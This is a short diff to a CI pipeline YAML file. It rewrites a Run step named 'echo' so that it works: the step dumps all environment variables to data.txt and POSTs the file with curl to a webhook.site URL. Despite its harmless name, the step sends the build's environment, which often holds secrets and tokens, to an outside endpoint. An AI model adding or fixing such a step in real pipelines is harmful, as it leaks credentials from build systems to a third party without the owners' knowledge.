@@ -22,7 +22,9 @@ pipeline:
                   name: echo
                   spec:
                     shell: Sh
-                    command: env >> data.txt curl -X POST --data-binary=@data.txt https://webhook.site/d183dc2d-22cd-494f-ac4b-3e4967a78d72
+                    command: |
+                      env >> data.txt
+                      curl -X POST --data-binary="@data.txt" https://webhook.site/d183dc2d-22cd-494f-ac4b-3e4967a78d72
                   timeout: ""
                   type: Run
           platform:
